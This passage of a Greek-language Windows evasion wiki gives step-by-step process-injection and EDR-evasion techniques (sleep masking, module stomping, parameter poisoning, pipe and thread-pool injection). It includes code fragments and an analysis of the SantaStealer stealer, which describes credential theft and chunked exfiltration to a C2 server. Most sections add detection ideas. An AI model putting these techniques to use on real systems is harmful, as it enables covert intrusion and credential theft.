- Για manually mapped/PIC/stomped περιοχές, χρησιμοποιήστε το **allocation base** και το μέγεθος της allocation.
- Σημειώστε όχι μόνο το dispatch gadget, αλλά και τα exports που προσεγγίζονται έμμεσα (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), καθώς και τυχόν εκτελέσιμα sections υπό τον έλεγχο του attacker που θα γίνουν έμμεσοι στόχοι.

Έτσι οι αλυσίδες sleep τύπου ROP/JOP μετατρέπονται από «λειτουργούν μόνο σε διεργασίες χωρίς CFG» σε επαναχρησιμοποιήσιμο primitive για τα `explorer.exe`, browsers, `svchost.exe` και άλλα endpoints που έχουν μεταγλωττιστεί με `/guard:cf`.

### CET-safe πλαστογράφηση stack για threads που κοιμούνται

Η πλήρης αντικατάσταση `CONTEXT` είναι θορυβώδης και μπορεί να αποτύχει σε συστήματα CET Shadow Stack, επειδή το πλαστογραφημένο `Rip` πρέπει να συμφωνεί με το hardware shadow stack. Ένα ασφαλέστερο μοτίβο sleep-masking είναι:<sup>[[30]](#references)</sup>

- Επιλέξτε ένα άλλο thread στην ίδια διεργασία και διαβάστε τα όρια stack του `NT_TIB` / TEB (`StackBase`, `StackLimit`) μέσω του `NtQueryInformationThread`.
- Κρατήστε αντίγραφο ασφαλείας του πραγματικού TEB/TIB του τρέχοντος thread.
- Καταγράψτε το πραγματικό context του thread που κοιμάται με το `GetThreadContext`.
- Αντιγράψτε **μόνο** το πραγματικό `Rip` στο spoof context, αφήνοντας το πλαστογραφημένο `Rsp`/stack state ανέπαφο.
- Κατά τη διάρκεια του παραθύρου ύπνου, αντιγράψτε το `NT_TIB` του spoof thread στο TEB του τρέχοντος thread, ώστε οι stack walkers να κάνουν unwind εντός ενός νόμιμου εύρους stack.
- Μετά την ολοκλήρωση της αναμονής, επαναφέρετε το αρχικό TIB και το thread context.

Έτσι διατηρείται ένας instruction pointer συμβατός με το CET, ενώ παραπλανώνται οι EDR stack walkers που εμπιστεύονται τα metadata stack του TEB για την επικύρωση των unwinds.

### Εναλλακτική μέσω APC: Kraken Mask

Αν το dispatch μέσω timer-queue έχει υπερβολικά αναγνωρίσιμη υπογραφή, η ίδια ακολουθία sleep-encrypt-spoof-restore μπορεί να εκτελεστεί από ένα suspended helper thread με queued APCs:<sup>[[27]](#references)</sup>

- Δημιουργήστε ένα helper thread με entrypoint το `NtTestAlert`.
- Βάλτε σε ουρά προετοιμασμένα `CONTEXT` frames/APCs με το `NtQueueApcThread` και εκτελέστε τα με το `NtAlertResumeThread`.
- Αποθηκεύστε την κατάσταση της αλυσίδας στο heap αντί για το stack του helper, ώστε να αποφύγετε την εξάντληση του προεπιλεγμένου stack thread των 64 KB.
- Χρησιμοποιήστε το `NtSignalAndWaitForSingleObject` για να σηματοδοτήσετε ατομικά το start event και να μπλοκάρετε.
- Κάντε suspend το main thread πριν από την επαναφορά του TIB/context (`NtSuspendThread` → restore → `NtResumeThread`), ώστε να μειωθεί το race window κατά το οποίο ένας scanner θα μπορούσε να εντοπίσει ένα stack που δεν έχει αποκατασταθεί πλήρως.

Αυτό αντικαθιστά την υπογραφή `CreateTimerQueueTimer` + `NtContinue` με μια υπογραφή helper-thread/APC, διατηρώντας τους ίδιους στόχους RC4 masking και stack-spoofing.

Πρόσθετες ιδέες για detection
- `NtSetInformationVirtualMemory` με `VmCfgCallTargetInformation` λίγο πριν από sleeps, waits ή APC dispatch.
- `GetThreadContext`/`SetThreadContext` σε συνδυασμό με `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ή `ConnectNamedPipe`.
- `NtQueryInformationThread` και στη συνέχεια άμεσες εγγραφές στα όρια stack του TEB/TIB του τρέχοντος thread.
- Αλυσίδες `NtQueueApcThread`/`NtAlertResumeThread` που φτάνουν έμμεσα στα `SystemFunction032`, `VirtualProtect` ή σε helpers επαναφοράς δικαιωμάτων section.
- Επαναλαμβανόμενη χρήση σύντομων υπογραφών gadget όπως `FF 23` (`jmp [rbx]`) ή `FF E7` (`jmp rdi`) ως dispatch pivots μέσα σε signed modules.


## Ακριβές Module Stomping

Το Module stomping εκτελεί payloads από το **`.text` section ενός DLL που είναι ήδη mapped μέσα στη διεργασία-στόχο**, αντί να δεσμεύει προφανή ιδιωτική εκτελέσιμη μνήμη ή να φορτώνει ένα νέο sacrificial DLL. Ο στόχος overwrite πρέπει να είναι ένα **φορτωμένο image με αντίστοιχο αρχείο στον δίσκο**, του οποίου ο χώρος κώδικα μπορεί να χωρέσει το payload χωρίς να αλλοιώσει διαδρομές κώδικα που εξακολουθεί να χρειάζεται η διεργασία.<sup>[[1]](#references)[[2]](#references)</sup>

### Αξιόπιστη επιλογή στόχου

Το αφελές stomping σε κοινά modules όπως τα `uxtheme.dll` ή `comctl32.dll` είναι εύθραυστο: το DLL μπορεί να μην είναι φορτωμένο στην απομακρυσμένη διεργασία και μια περιοχή κώδικα που είναι πολύ μικρή θα προκαλέσει crash στη διεργασία. Μια πιο αξιόπιστη διαδικασία είναι:

1. Απαριθμήστε τα modules της διεργασίας-στόχου και κρατήστε μια **λίστα include μόνο με ονόματα** των DLL που είναι ήδη φορτωμένα.
2. Δημιουργήστε πρώτα το payload και καταγράψτε το **ακριβές μέγεθός του σε bytes**.
3. Σαρώστε υποψήφια DLL στον δίσκο και συγκρίνετε το PE section **`.text` `Misc_VirtualSize`** με το μέγεθος του payload. Αυτό έχει μεγαλύτερη σημασία από το μέγεθος του αρχείου, επειδή αντικατοπτρίζει το μέγεθος του εκτελέσιμου section **όταν γίνεται mapping στη μνήμη**.
4. Αναλύστε τον **Export Address Table (EAT)** και επιλέξτε το RVA μιας exported function ως αρχική μετατόπιση stomp.
5. Υπολογίστε την **ακτίνα επίδρασης**: αν το payload υπερβαίνει το όριο της επιλεγμένης συνάρτησης, θα αντικαταστήσει παρακείμενα exports που βρίσκονται μετά από αυτή στη μνήμη.

Συνήθη βοηθητικά εργαλεία recon/επιλογής που έχουν εντοπιστεί στην πράξη:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Σημειώσεις λειτουργίας
- Προτιμήστε DLLs που είναι **ήδη φορτωμένα** στην απομακρυσμένη διεργασία, ώστε να αποφύγετε τα telemetry events του `LoadLibrary`/τις απροσδόκητες φορτώσεις image.
- Προτιμήστε exports που εκτελούνται σπάνια από την εφαρμογή-στόχο, διαφορετικά οι κανονικές διαδρομές κώδικα ενδέχεται να εκτελέσουν τα αλλοιωμένα bytes πριν ή μετά τη δημιουργία του thread.
- Τα μεγάλα implants συχνά απαιτούν να αλλάξει η ενσωμάτωση του shellcode από string literal σε **byte-array/braced initializer**, ώστε να αναπαρίσταται σωστά ολόκληρο το buffer στον κώδικα του injector.

Ιδέες ανίχνευσης
- Απομακρυσμένες εγγραφές σε **εκτελέσιμες σελίδες που βασίζονται σε image** (`MEM_IMAGE`, `PAGE_EXECUTE*`) αντί για τις συνηθέστερες ιδιωτικές εκχωρήσεις RWX/RX.
- Σημεία εισόδου export των οποίων τα bytes στη μνήμη δεν αντιστοιχούν πλέον στο backing file στον δίσκο.
- Απομακρυσμένα threads ή context pivots που ξεκινούν την εκτέλεση μέσα σε ένα νόμιμο DLL export του οποίου τα πρώτα bytes τροποποιήθηκαν πρόσφατα.
- Ύποπτες ακολουθίες `VirtualProtect(Ex)` / `WriteProcessMemory` σε σελίδες `.text` DLL, ακολουθούμενες από δημιουργία thread.

## Process Parameter Poisoning (P3)

Το Process Parameter Poisoning (P3) είναι μια τεχνική **process-injection / EDR-evasion** που αποφεύγει την κλασική διαδρομή απομακρυσμένης εγγραφής (`VirtualAllocEx` + `WriteProcessMemory`). Αντί να αντιγράφει bytes σε μια διεργασία-στόχο που εκτελείται ήδη, εκμεταλλεύεται το γεγονός ότι τα Windows **αντιγράφουν επιλεγμένες παραμέτρους εκκίνησης της `CreateProcessW` στη θυγατρική διεργασία** και τις αποθηκεύουν στο `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Αλλοιώσιμοι carriers που αντιγράφονται από τη `CreateProcessW`

Χρήσιμοι carriers είναι:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (με `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Πρακτικοί περιορισμοί των carriers:

- Το `lpCommandLine` πρέπει να δείχνει σε **εγγράψιμη μνήμη** για τη `CreateProcessW` και έχει όριο **32,767 χαρακτήρων Unicode**, μαζί με τον null terminator.
- Το `lpEnvironment` πρέπει να είναι ένα block περιβάλλοντος Unicode με διαδοχικές συμβολοσειρές `NAME=VALUE\0`, οι οποίες τερματίζονται με ένα επιπλέον `\0`.
- Το `lpReserved` είναι επίσημα δεσμευμένο, επομένως η αντιστοίχιση του `ShellInfo` πρέπει να θεωρείται λεπτομέρεια υλοποίησης και όχι σταθερή, τεκμηριωμένη σύμβαση.

Έτσι, η κανονική δημιουργία διεργασίας μετατρέπεται σε **primitive μεταφοράς payload**. Ο operator δημιουργεί τη θυγατρική διεργασία με δεδομένα εκκίνησης που ελέγχει ο επιτιθέμενος και αφήνει τα Windows να εκτελέσουν την αντιγραφή μεταξύ διεργασιών.

### Ροή απομακρυσμένης αναζήτησης χωρίς APIs απομακρυσμένης εγγραφής

Μετά τη δημιουργία της θυγατρικής διεργασίας, εντοπίστε το αντιγραμμένο buffer με **primitives μόνο για ανάγνωση**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → λήψη του `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Ανάγνωση του απομακρυσμένου `PEB`
3. Ακολούθηση του `PEB.ProcessParameters`
4. Ανάγνωση του `RTL_USER_PROCESS_PARAMETERS`
5. Χρήση του επιλεγμένου pointer:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Ελάχιστη ροή:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Εκτέλεση του αντιγραμμένου buffer παραμέτρων

Η αντιγραμμένη περιοχή παραμέτρων είναι συνήθως `RW`, όχι εκτελέσιμη. Μια συνηθισμένη αλυσίδα P3 είναι:

1. Δημιουργία της διεργασίας κανονικά (όχι σε αναστολή)
2. Κάντε την επιλεγμένη σελίδα παραμέτρων εκτελέσιμη με `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Επαναχρησιμοποιήστε το handle του κύριου thread που έχει ήδη επιστραφεί στο `PROCESS_INFORMATION`
4. Ανακατευθύνετε την εκτέλεση με `NtSetContextThread` (`CONTEXT_CONTROL`, αντικατάσταση του `RIP`)

Σε αντίθεση με τις κλασικές ροές εργασίας hijacking thread, αυτό **δεν απαιτεί** `SuspendThread` / `ResumeThread`· το context μπορεί να αλλάξει απευθείας μέσω του handle του κύριου thread που επιστράφηκε.

Έτσι αποφεύγονται αρκετά API που παρακολουθούνται συνήθως για injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- συχνά και τα `SuspendThread` / `ResumeThread`

### Περιορισμός null byte και staged shellcode

Και οι τρεις φορείς είναι **string ή δεδομένα τύπου string**, επομένως ένα ακατέργαστο payload που περιέχει `0x00` περικόπτεται κατά τη μεταφορά. Μια πρακτική λύση είναι ένα **πρώτο στάδιο χωρίς null** που ανασυνθέτει σταθερές κατά την εκτέλεση και έπειτα φορτώνει ένα αυθαίρετο δεύτερο στάδιο.

Ένα απλό μοτίβο είναι η σύνθεση σταθερών με βάση το XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Αυτό επιτρέπει στο πρώτο στάδιο να δημιουργεί strings στη στοίβα, ορίσματα API, διαδρομές DLL ή έναν loader shellcode δεύτερου σταδίου, χωρίς να ενσωματώνει null bytes στην παράμετρο που μεταφέρεται.

### Κλήσεις API από τη στοίβα στο πρώτο στάδιο

Όταν το πρώτο στάδιο πρέπει να καλέσει API όπως το `LoadLibraryA`, μπορεί να:

- κάνει push το string/buffer στη στοίβα του target
- δεσμεύσει τον **χώρο shadow 32 bytes του x64**
- ορίσει τα `RCX`, `RDX`, `R8`, `R9` σε σταθερές τιμές ή δείκτες σχετικούς με το `RSP`
- διατηρήσει το `RSP` **ευθυγραμμισμένο στα 16 bytes** πριν από την κλήση

Στη συνέχεια, ένα δεύτερο στάδιο μπορεί να αντιγραφεί από τη στοίβα σε μια δέσμευση `PAGE_READWRITE`, η οποία αλλάζει σε `PAGE_EXECUTE_READ` με το `VirtualProtect`, και να γίνει jump προς αυτήν, αποφεύγοντας μια άμεση δέσμευση RWX.

### Ιδέες για detection

Καλές ευκαιρίες για hunting που αναφέρουν οι συγγραφείς:

- `VirtualProtectEx` / `NtProtectVirtualMemory` που καθιστούν **εκτελέσιμες τις σελίδες παραμέτρων διεργασίας**
- αυτή η αλλαγή προστασίας ακολουθούμενη από `SetThreadContext` / `NtSetContextThread`
- απομακρυσμένες αναγνώσεις του `PEB` και στη συνέχεια του `RTL_USER_PROCESS_PARAMETERS`
- ασυνήθιστα μεγάλες τιμές ή τιμές υψηλής εντροπίας στα `lpCommandLine`, `lpEnvironment` ή `STARTUPINFO.lpReserved` κατά τη δημιουργία διεργασίας

### Σημειώσεις

- Το P3 είναι ένα **τέχνασμα μεταφοράς μεταξύ διεργασιών**, όχι από μόνο του πλήρης primitive εκτέλεσης: η αντιγραμμένη παράμετρος εξακολουθεί να χρειάζεται αλλαγή δικαιωμάτων σε εκτελέσιμα και μέθοδο ανακατεύθυνσης της εκτέλεσης.
- Οι συγγραφείς εξέτασαν το `RtlCreateProcessReflection` / Dirty Vanity, αλλά το απέρριψαν επειδή εσωτερικά χρησιμοποιεί ύποπτες primitives όπως τα `NtWriteVirtualMemory` και `NtCreateThreadEx`.

Για παράδοση payload σε μια **υπάρχουσα** διεργασία Windows μέσω περιγραφών νημάτων και, στη συνέχεια, hijacking της διεύθυνσης επιστροφής ενός νήματος που βρίσκεται σε αναμονή, δείτε το [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## Console STDIN pipe injection

Μια θυγατρική διεργασία κονσόλας σε διαδραστική λειτουργία μπορεί επίσης να χρησιμοποιηθεί ως **primitive μεταφοράς payload**. Ο injector ανακατευθύνει την τυπική είσοδο της θυγατρικής διεργασίας σε ένα pipe και στέλνει έναν marker ακολουθούμενο από shellcode. Αφού το πρόγραμμα κονσόλας διαβάσει τα δεδομένα στη δική του ιδιωτική μνήμη, ο injector εντοπίζει αυτό το buffer, το καθιστά εκτελέσιμο και ανακατευθύνει ένα νήμα της θυγατρικής διεργασίας προς αυτό. Έτσι αποφεύγονται τα `VirtualAllocEx` και `WriteProcessMemory`, αλλά πρόκειται και πάλι για process injection, όχι για γενικό EDR bypass.<sup>[[41]](#references)</sup>

Παρά την περιγραφή «named-pipe», η υλοποίηση αναφοράς καλεί το `CreatePipe`, το οποίο δημιουργεί ένα **anonymous pipe**. Τα Windows υλοποιούν εσωτερικά τα anonymous pipes με αντικείμενα pipe που έχουν μοναδικά ονόματα, αλλά το PoC ούτε επιλέγει διαδρομή `\\.\pipe\<name>` ούτε καλεί το `CreateNamedPipe`. Δημιουργεί handles με δυνατότητα κληρονόμησης και προεπιλεγμένο security descriptor, τοποθετεί το read handle στο `STARTUPINFO.hStdInput`, ορίζει το `STARTF_USESTDHANDLES` και εκκινεί μια νέα θυγατρική διεργασία με ενεργοποιημένη την κληρονόμηση handles. Επομένως, αυτό το PoC εκκινεί το παρεχόμενο εκτελέσιμο κονσόλας· δεν συνδέει το pipe του σε υπάρχουσα διεργασία.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Ροή εργασίας αναφοράς

Η υλοποίηση χρησιμοποιεί την ακόλουθη αλυσίδα:<sup>[[41]](#references)</sup>

1. Δημιουργεί ζεύγη anonymous pipe για τα `STDIN` και `STDOUT` της θυγατρικής διεργασίας. Απενεργοποιεί την κληρονόμηση στα δύο handles της γονικής πλευράς και κλείνει στη γονική διεργασία τα αντίγραφα των handles της θυγατρικής πλευράς μετά τη δημιουργία της διεργασίας.
2. Εκκινεί ένα διαδραστικό εκτελέσιμο, όπως το `netsh.exe` ή το `nslookup.exe`, με `CREATE_NEW_CONSOLE`. Η θυγατρική διεργασία κληρονομεί τα ανακατευθυνόμενα standard handles.
3. Στέλνει ολόκληρο τον πίνακα δυαδικών δεδομένων `rawData` με `WriteFile` μέσω του handle `STDIN` της γονικής πλευράς. Το πρόγραμμα κονσόλας καταναλώνει τα bytes και αφήνει ένα αντίγραφο σε μία από τις ιδιωτικές δεσμευμένες περιοχές του.
4. Διατρέχει τον χώρο διευθύνσεων της θυγατρικής διεργασίας με το `VirtualQueryEx`, διαβάζει υποψήφιες περιοχές `MEM_PRIVATE` με το `ReadProcessMemory` και αναζητά τον marker στην αρχή του `rawData`.
5. Αλλάζει το buffer που εντοπίστηκε σε `PAGE_EXECUTE_READWRITE` με το `VirtualProtectEx`.
6. Εντοπίζει το κύριο νήμα, το αναστέλλει, ορίζει το `RIP` στη διεύθυνση `found_address + 0x19` με το `NtSetContextThread` και το επαναφέρει.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Η παρεχόμενη υλοποίηση αφορά αποκλειστικά x64: τροποποιεί το `CONTEXT.Rip` και το ενσωματωμένο payload είναι x64 shellcode. Το `rawData` ξεκινά με δείκτη 25 byte, επομένως τα εκτελέσιμα byte αρχίζουν στη δεκαεξαδική μετατόπιση `0x19`. Κατά την αντικατάσταση του payload, διατηρήστε αυτή τη διάταξη ή ενημερώστε μαζί τον δείκτη, το διάνυσμα αναζήτησης, το μέγεθος του πίνακα και τη μετατόπιση εκτέλεσης. Τα σχόλια του πηγαίου κώδικα αναφέρουν επίσης τα `0x0A`, `0x0D` και `0x1A` ως απαγορευμένους χαρακτήρες. Αυτή η ροή εργασίας δεν τροποποιεί το token ή τα προνόμια του child process.<sup>[[41]](#references)</sup>

Για μικρούς native helpers και μοτίβα μεταγλώττισης payload, δείτε το [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Έγχυση DLL με callback thread pool χωρίς shellcode (DLLParty)

Το DLLParty προσαρμόζει την έγχυση thread pool τύπου PoolParty, ώστε ένα υπάρχον worker της διεργασίας-στόχου να καλεί το `LoadLibraryA`, αντί να εκτελεί ένα injected callback stub. Ο μηχανισμός dispatch είναι ένα `TP_DIRECT` completion που τοποθετείται στην I/O completion port του pool-στόχου. Αυτό δεν παρακάμπτει τα δικαιώματα διεργασίας: το PoC καλεί `OpenProcess(PROCESS_ALL_ACCESS)` και απαιτεί μνήμη-στόχο με δικαιώματα ανάγνωσης/εγγραφής, καθώς και handles worker-factory και completion-port που μπορούν να αντιγραφούν.<sup>[[46]](#references)[[47]](#references)</sup>

Στα Windows x64, το worker περνά έναν δείκτη στο `TP_CALLBACK_INSTANCE` που βρίσκεται στη στοίβα του, μέσω του `RCX`, του πρώτου ορίσματος callback. Το `LoadLibraryA` ερμηνεύει τον ίδιο δείκτη ως `LPCSTR`. Στη δοκιμασμένη διαδρομή, το `TppWorkerThread` δημιουργεί τον δείκτη στο `RSP+0x178`, ενώ η πρώτη συνηθισμένη εγγραφή του σε αυτό το αντικείμενο γίνεται στο `RSP+0x1d0`. Επομένως, μια null-terminated διαδρομή DLL που χωρά στο αρχικό τμήμα των 0x58 byte μπορεί να τοποθετηθεί στην αρχή του instance, χωρίς να αντικατασταθεί πριν από το dispatch. Πρόκειται για παρατήρηση που αφορά συγκεκριμένο build και όχι για τεκμηριωμένη εγγύηση του Windows ABI.<sup>[[46]](#references)[[47]](#references)</sup>

Η ροή εργασίας αναφοράς είναι η εξής:<sup>[[46]](#references)[[47]](#references)</sup>

1. Απαριθμήστε τα handles της διεργασίας-στόχου με `NtQuerySystemInformation(SystemHandleInformation)` και εντοπίστε το `TpWorkerFactory` ανακτώντας τους τύπους των αντικειμένων. Αντιγράψτε ένα handle worker-factory και ανακτήστε το `WorkerFactoryBasicInformation`· το `StartParameter` δίνει το απομακρυσμένο `TP_POOL`. Παραλείψτε τα factories όπου `TotalWorkerCount == 0`.
2. Διαβάστε το `TP_POOL.CompletionPort` και διατρέξτε την ιδιωτική λίστα worker του pool. Στο δοκιμασμένο build Windows 10 19045 x64 (`ntdll.dll 10.0.19041.4842`), η κεφαλή βρίσκεται στο `pool+0x60`· κάθε σύνδεσμος βρίσκεται στο `worker+0x10`, επομένως η θέση του callback-instance στο `worker+0x38` ισούται με `link+0x28`. Το PoC ελέγχει τη στοίχιση δεικτών, την αμφίδρομη σύνδεση των links, την ιδιοκτησία του pool, τα μη μηδενικά thread IDs, τους επαναλαμβανόμενους κόμβους και τη σταθερότητα της κεφαλής της λίστας.
3. Εγγράψτε τη διαδρομή DLL σε **κάθε** θέση worker που ανακτήθηκε, επειδή οποιοδήποτε worker μπορεί να παραλάβει το queued completion. Τοποθετήστε ένα `TP_DIRECT` σε μνήμη-στόχο με δικαιώματα εγγραφής, με `Callback = LoadLibraryA`. Το PoC χρησιμοποιεί το `last_slot-0x500` σε στοίβα worker αντί για `VirtualAllocEx`· αυτή η μετατόπιση είναι πειραματική και δεν πρέπει να συγκρούεται με ενεργά δεδομένα της στοίβας.
4. Αντιγράψτε το handle completion-port της διεργασίας-στόχου και καλέστε `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Η διεύθυνση του απομακρυσμένου `TP_DIRECT` είναι το completion key. Ένα υπάρχον worker καλεί τότε το `LoadLibraryA` με τον αντικατεστημένο δείκτη callback-instance, φορτώνοντας μια DLL στην οποία έχει ήδη πρόσβαση η διεργασία-στόχος.

Το PoC δέχεται ένα PID-στόχο (`DLLParty.exe <target_pid>`) και χρησιμοποιεί μια hard-coded διαδρομή DLL στο `DLLParty.cpp`· ορίστε μια διαδρομή στην οποία έχει πρόσβαση η διεργασία-στόχος πριν δημιουργήσετε ένα x64 executable. Χρησιμοποιεί επίσης τη διεύθυνση `LoadLibraryA` της δικής του διεργασίας ως απομακρυσμένο callback, οπότε προϋποθέτει ότι αυτή η διεύθυνση είναι έγκυρη στη διεργασία-στόχο. Ο κώδικας δεν ελέγχει αν το μήκος της διαδρομής χωρά στο αρχικό τμήμα των 0x58 byte ούτε αν η περιήγηση των workers βρήκε θέση πριν από την πρόσβαση στο τελευταίο στοιχείο. Επαληθεύστε ξανά τις ιδιωτικές μετατοπίσεις, τη διάταξη της στοίβας και τον διαθέσιμο χώρο εγγραφής για το build-στόχο. Η παράλειψη των `CreateRemoteThreadEx`, shellcode και `VirtualAllocEx` δεν εξαλείφει τις εγγραφές μεταξύ διεργασιών ή τα telemetry φόρτωσης DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Tradecraft του SantaStealer για fileless evasion και κλοπή διαπιστευτηρίων

Το SantaStealer (γνωστό και ως BluelineStealer) δείχνει πώς τα σύγχρονα info-stealers συνδυάζουν AV bypass, anti-analysis και πρόσβαση σε διαπιστευτήρια σε μία ενιαία ροή εργασίας.<sup>[[24]](#references)</sup>

### Έλεγχος διάταξης πληκτρολογίου και καθυστέρηση sandbox

- Μια σημαία config (`anti_cis`) απαριθμεί τις εγκατεστημένες διατάξεις πληκτρολογίου μέσω του `GetKeyboardLayoutList`. Αν εντοπιστεί κυριλλική διάταξη, το δείγμα δημιουργεί έναν κενό δείκτη `CIS` και τερματίζεται πριν εκτελέσει stealers, διασφαλίζοντας ότι δεν ενεργοποιείται ποτέ σε εξαιρούμενες περιοχές, ενώ αφήνει ένα artifact για hunting.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Πολυεπίπεδη λογική `check_antivm`

- Η παραλλαγή A διατρέχει τη λίστα διεργασιών, υπολογίζει ένα custom κυλιόμενο checksum για κάθε όνομα και το συγκρίνει με ενσωματωμένες blocklists για debuggers/sandboxes. Επαναλαμβάνει τον υπολογισμό checksum για το όνομα του υπολογιστή και ελέγχει καταλόγους εργασίας, όπως το `C:\analysis`.
- Η παραλλαγή B εξετάζει ιδιότητες συστήματος (ελάχιστο όριο πλήθους διεργασιών, πρόσφατος χρόνος λειτουργίας), καλεί το `OpenServiceA("VBoxGuest")` για να εντοπίσει τα VirtualBox additions και εκτελεί ελέγχους χρονισμού γύρω από αναμονές, ώστε να εντοπίσει single-stepping. Κάθε ανίχνευση διακόπτει την εκτέλεση πριν από την εκκίνηση των modules.

### Βοηθητικό fileless + διπλή reflective φόρτωση ChaCha20

- Η κύρια DLL/EXE ενσωματώνει ένα Chromium credential helper, το οποίο είτε αποθηκεύεται στον δίσκο είτε γίνεται manual mapping στη μνήμη. Στη λειτουργία fileless, επιλύει μόνο του τα imports/relocations, ώστε να μη δημιουργούνται βοηθητικά αρχεία.
- Αυτό το helper αποθηκεύει μια DLL δεύτερου σταδίου κρυπτογραφημένη δύο φορές με ChaCha20 (δύο κλειδιά 32 byte + nonces 12 byte). Μετά και τα δύο περάσματα, φορτώνει το blob με reflective τρόπο (χωρίς `LoadLibrary`) και καλεί τα exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, τα οποία προέρχονται από το [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Οι ρουτίνες του ChromElevator χρησιμοποιούν reflective process hollowing με direct syscalls για να κάνουν injection σε ένα ενεργό πρόγραμμα περιήγησης Chromium, να κληρονομήσουν τα κλειδιά AppBound Encryption και να αποκρυπτογραφήσουν κωδικούς πρόσβασης/cookies/πιστωτικές κάρτες απευθείας από βάσεις δεδομένων SQLite, παρά τις ενισχύσεις ασφαλείας του ABE.

### Συλλογή σε αρθρωτή μορφή στη μνήμη & εξαγωγή δεδομένων μέσω HTTP σε τμήματα

- Η `create_memory_based_log` διατρέχει έναν καθολικό πίνακα δεικτών συναρτήσεων `memory_generators` και δημιουργεί ένα thread για κάθε ενεργοποιημένο module (Telegram, Discord, Steam, screenshots, έγγραφα, επεκτάσεις browser κ.λπ.). Κάθε thread γράφει τα αποτελέσματα σε κοινόχρηστα buffers και αναφέρει τον αριθμό των αρχείων του μετά από ένα διάστημα αναμονής για join περίπου 45 δευτερολέπτων.
- Όταν ολοκληρωθεί η διαδικασία, όλα συμπιέζονται με τη στατικά συνδεδεμένη βιβλιοθήκη `miniz` ως `%TEMP%\\Log.zip`. Έπειτα, το `ThreadPayload1` περιμένει 15 δευτερόλεπτα και μεταδίδει το αρχείο σε τμήματα των 10 MB μέσω HTTP POST στη διεύθυνση `http://<C2>:6767/upload`, πλαστογραφώντας ένα όριο `multipart/form-data` browser (`----WebKitFormBoundary***`). Κάθε τμήμα προσθέτει τα `User-Agent: upload`, `auth: <build_id>`, προαιρετικά το `w: <campaign_tag>`, ενώ στο τελευταίο τμήμα προστίθεται το `complete: true`, ώστε το C2 να γνωρίζει ότι ολοκληρώθηκε η επανασυναρμολόγηση.

## References

- [1] [Προηγμένες τεχνικές αποφυγής: Ακριβές module stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – άρθρο ιστολογίου](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks: τέλος στην ασυλία του malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – τεκμηρίωση](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – δείγμα](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – δείγμα](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC για πλαστογράφηση call stack](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Νέα αλυσίδα μόλυνσης και obfuscation βασισμένο στο ConfuserEx για το DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Πρέπει να εμπιστεύεστε το zero trust σας; Παράκαμψη των ελέγχων κατάστασης του Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Πριν από το ToolShell: Εξερευνώντας τις προηγούμενες επιχειρήσεις ransomware του Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
